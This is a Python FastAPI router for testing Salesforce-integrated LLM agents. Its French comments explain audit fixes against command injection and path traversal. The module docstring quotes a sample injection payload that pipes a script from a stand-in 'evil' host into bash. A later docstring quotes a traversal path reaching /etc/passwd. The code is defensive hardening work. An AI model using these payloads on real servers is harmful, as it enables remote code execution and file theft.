"""
Agent Tester API - Test REAL agents with Salesforce integration

Uses the same agent scripts as pm_orchestrator_service_v2.py

LOT-C (gem:SEC-01, gem:SEC-02, kim:SEC-01, kim:SEC-02) — ce routeur portait la
faille la plus grave de l'audit du 21/08 : `GET /org/query?soql=...`
interpolait son parametre d'URL dans une chaine passee a
`subprocess.run(..., shell=<actif>)`, sans aucune authentification, joignable
depuis Internet. `?soql=" ; curl evil.sh | bash #` s'executait sur le serveur
avec les droits du service.

Trois verrous sont poses ici, independants l'un de l'autre :

  1. authentification au niveau du routeur (`dependencies=[...]`), donc valable
     aussi pour toute route ajoutee ensuite. Le routeur declenche des
     executions LLM facturees : anonyme, il etait aussi une ruine financiere ;
  2. plus de shell. Le SOQL est un element de `argv`, jamais un fragment de
     ligne de commande : `;`, `|`, `$(...)`, backticks et guillemets sont des
     octets de donnee que `sf` recoit tels quels ;
  3. le SOQL est valide avant d'etre transmis (requete de lecture uniquement,
     longueur bornee), pour qu'il ne puisse pas non plus se faire passer pour
     une option du CLI `sf`.

La regle nginx qui bloque cette route en 403 sur le VPS reste en place : elle
ne doit etre retiree qu'apres deploiement effectif de ce correctif.
"""
import json
import re
import subprocess
from pathlib import Path

from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import StreamingResponse
from pydantic import BaseModel

from app.salesforce_config import salesforce_config, SalesforceConfigError
from app.services.agent_executor import get_agent_executor, AGENT_CONFIG
from app.utils.dependencies import get_current_user

router = APIRouter(
    prefix="/agent-tester",
    tags=["Agent Tester"],
    dependencies=[Depends(get_current_user)],
)

# UI Agent definitions (display info only - real config is in agent_executor.py)
AGENTS = {
    "olivia": {"name": "Olivia", "role": "Business Analyst", "description": "Analyse les besoins business, crée les Use Cases à partir des BRs", "capabilities": ["requirements", "use_cases", "process_flows"], "color": "#EC4899"},
    "marcus": {"name": "Marcus", "role": "Solution Architect", "description": "Analyse l org existante, conçoit l architecture", "capabilities": ["architecture", "design"], "color": "#8B5CF6"},
    "sophie": {"name": "Sophie", "role": "Product Manager", "description": "Orchestre le projet, extrait les Business Requirements du brief", "capabilities": ["pm", "requirements", "orchestration"], "color": "#6366F1"},
    "diego": {"name": "Diego", "role": "Apex Developer", "description": "Développe classes Apex, triggers et tests", "capabilities": ["classes", "triggers"], "color": "#1E40AF"},
    "zara": {"name": "Zara", "role": "LWC Developer", "description": "Développe Lightning Web Components", "capabilities": ["lwc", "aura"], "color": "#7C3AED"},
    "raj": {"name": "Raj", "role": "Salesforce Admin", "description": "Configure objets, flows, permissions", "capabilities": ["objects", "flows"], "color": "#059669"},
    "elena": {"name": "Elena", "role": "QA Engineer", "description": "Crée et exécute les tests Apex", "capabilities": ["test_classes"], "color": "#DC2626"},
    "jordan": {"name": "Jordan", "role": "DevOps Engineer", "description": "Gère déploiements et CI/CD", "capabilities": ["deployment"], "color": "#F59E0B"},
    "aisha": {"name": "Aisha", "role": "Data Migration Specialist", "description": "Migre et transforme les données", "capabilities": ["data_migration"], "color": "#10B981"},
    "lucas": {"name": "Lucas", "role": "Trainer", "description": "Crée documentation utilisateur et guides de formation", "capabilities": ["training", "documentation"], "color": "#14B8A6"},
    "emma": {"name": "Emma", "role": "Research Analyst", "description": "Analyse les UCs, valide la couverture, rédige le SDS", "capabilities": ["analyze", "validate", "write_sds"], "color": "#F472B6"}
}

class AgentTestRequest(BaseModel):
    task_description: str
    deploy_to_org: bool = False
    use_rag: bool = True

def make_sse(data: dict) -> str:
    return f"data: {json.dumps(data)}\n\n"

@router.get("/agents")
async def list_agents():
    # LOT-E bis : les identites d'org ne sont plus codees en dur, ces trois
    # champs valent None quand aucune org n'est configuree. `connected` etait
    # jusqu'ici la constante True — il annoncait une org connectee meme sans
    # org du tout. Il reflete desormais l'etat reel de la configuration.
    return {
        "agents": AGENTS,
        "salesforce_org": {
            "alias": salesforce_config.org_alias,
            "username": salesforce_config.username,
            "instance_url": salesforce_config.instance_url,
            "connected": salesforce_config.is_configured(),
            "missing": salesforce_config.missing_identity(),
        }
    }

@router.get("/agents/{agent_id}")
async def get_agent(agent_id: str):
    if agent_id not in AGENTS:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    return AGENTS[agent_id]

# gem:SEC-01 / kim:SEC-02 — le SOQL accepte est une requete de lecture, et
# rien d'autre. Ce filtre n'est PAS ce qui bloque l'injection de commande (c'est
# `shell=False` plus bas qui la bloque) : il empeche le parametre de se faire
# passer pour une option du CLI `sf` (un `soql` commencant par `-`), et refuse
# les verbes d'ecriture qu'une route de consultation n'a pas a porter.
SOQL_MAX_LENGTH = 4000
_SOQL_READ_ONLY = re.compile(r"^\s*SELECT\s+.+\s+FROM\s+[A-Za-z0-9_]+", re.IGNORECASE | re.DOTALL)


def _validate_soql(soql: str) -> str:
    """Return the SOQL to hand to the CLI, or raise HTTP 400."""
    soql = (soql or "").strip()
    if not soql:
        raise HTTPException(status_code=400, detail="Parametre 'soql' vide.")
    if len(soql) > SOQL_MAX_LENGTH:
        raise HTTPException(
            status_code=400,
            detail=f"Requete SOQL trop longue ({len(soql)} > {SOQL_MAX_LENGTH} caracteres).",
        )
    if "\x00" in soql:
        raise HTTPException(status_code=400, detail="Requete SOQL invalide.")
    if not _SOQL_READ_ONLY.match(soql):
        raise HTTPException(
            status_code=400,
            detail="Seules les requetes SOQL de lecture sont acceptees "
                   "(forme attendue : SELECT ... FROM ...).",
        )
    return soql


@router.get("/org/query")
async def query_org(soql: str):
    """
    Execute a read-only SOQL query against the configured org.

    gem:SEC-01 / kim:SEC-02 : plus de shell, plus d'interpolation. La
    commande est une liste d'arguments — `soql` occupe une case d'`argv` et est
    remis a `sf` tel quel. Un `;`, un `|`, un `$(...)` ou un `\`` n'a plus
    d'interprete pour le lire : ce sont des caracteres dans une chaine.
    """
    soql = _validate_soql(soql)

    # LOT-E bis : sans org configuree, org_alias vaut None. On refuse ici, avec
    # un message exploitable, plutot que d'envoyer `--target-org None` au CLI.
    try:
        salesforce_config.require("org_alias")
    except SalesforceConfigError as exc:
        raise HTTPException(status_code=503, detail=str(exc))

    result = subprocess.run(
        [
            "sf", "data", "query",
            "--query", soql,
            "--target-org", salesforce_config.org_alias,
            "--json",
        ],
        shell=False,
        capture_output=True,
        text=True,
        timeout=30,
    )
    if result.returncode != 0:
        raise HTTPException(status_code=400, detail=result.stderr)
    try:
        return json.loads(result.stdout)
    except json.JSONDecodeError:
        raise HTTPException(status_code=502, detail="Reponse illisible du CLI Salesforce.")

@router.post("/test/{agent_id}/stream")
async def test_agent_stream(agent_id: str, request: AgentTestRequest):
    """
    Test a REAL agent with streaming response.
    Calls the actual agent scripts in /agents/roles/
    """
    if agent_id not in AGENTS:
        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
    
    # Check if agent is implemented in executor
    if agent_id not in AGENT_CONFIG:
        async def not_implemented():
            yield make_sse({"type": "error", "message": f"Agent {agent_id} non configuré dans AGENT_CONFIG"})
        return StreamingResponse(not_implemented(), media_type="text/event-stream")
    
    executor = get_agent_executor()
    
    # Use generic execute_agent for ALL agents
    generator = executor.execute_agent(
        agent_id=agent_id,
        task=request.task_description,
        deploy=request.deploy_to_org,
        use_rag=request.use_rag
    )
    
    return StreamingResponse(
        generator,
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"}
    )

@router.get("/workspace/files")
async def list_workspace_files():
    files = {}
    base_path = Path(salesforce_config.force_app_path)
    for folder in ["classes", "triggers", "lwc", "flows", "objects"]:
        folder_path = base_path / folder
        files[folder] = sorted(p.name for p in folder_path.iterdir()) if folder_path.is_dir() else []
    return {"workspace": salesforce_config.sfdx_project_path, "files": files}

@router.get("/llm/status")
async def get_llm_status():
    try:
        from app.services.llm_router_service import get_llm_router
        router = get_llm_router()
        return {
            "active_profile": router.get_active_profile(),
            "build_enabled": router.is_build_enabled(),
            "providers": router.get_available_providers(),
            "session_stats": router.get_session_stats(),
        }
    except Exception as e:
        return {"error": str(e), "available": False}

# ===== TEST LOGS ENDPOINTS =====
# For debugging and post-execution analysis


def _safe_log_id(test_id: str) -> str:
    """
    Reduce a log identifier to a single filename component.

    Meme famille que kim:SEC-03 (traversee de repertoire), sur un troisieme
    site que le rapport ne cite pas : `AgentTestLogger.get_log_by_filename()`
    fait `LOGS_DIR / filename` sans controle, et recevait ici le parametre
    d'URL tel quel. Starlette decode `%2F` dans les parametres de chemin, donc
    `/logs/..%2F..%2F..%2Fetc%2Fpasswd.json` sortait du repertoire de logs.
    `Path(...).name` ne laisse passer que le dernier segment : ni `..`, ni `/`,
    ni chemin absolu.
    """
    safe = Path((test_id or "").strip()).name.strip()
    if not safe or safe in (".", ".."):
        raise HTTPException(status_code=400, detail="Identifiant de log invalide.")
    return safe

@router.get("/logs")
async def list_test_logs(limit: int = 20):
    """List recent agent test logs for debugging"""
    try:
        from app.services.agent_test_logger import get_logger
        logger = get_logger()
        return {"logs": logger.list_logs(limit=limit)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/logs/{test_id}")
async def get_test_log(test_id: str):
    """Get detailed log for a specific test"""
    try:
        from app.services.agent_test_logger import get_logger
        logger = get_logger()
        safe_id = _safe_log_id(test_id)
        log = logger.get_log(safe_id)
        if not log:
            # Try by filename
            log = logger.get_log_by_filename(safe_id)
        if not log:
            raise HTTPException(status_code=404, detail=f"Log {test_id} not found")
        return log
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/logs/{test_id}/step/{step_number}")
async def get_test_log_step(test_id: str, step_number: int):
    """Get a specific step from a test log"""
    try:
        from app.services.agent_test_logger import get_logger
        logger = get_logger()
        safe_id = _safe_log_id(test_id)
        log = logger.get_log(safe_id)
        if not log:
            log = logger.get_log_by_filename(safe_id)
        if not log:
            raise HTTPException(status_code=404, detail=f"Log {test_id} not found")
        
        steps = log.get("steps", [])
        for step in steps:
            if step.get("step_number") == step_number:
                return step
        
        raise HTTPException(status_code=404, detail=f"Step {step_number} not found")
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
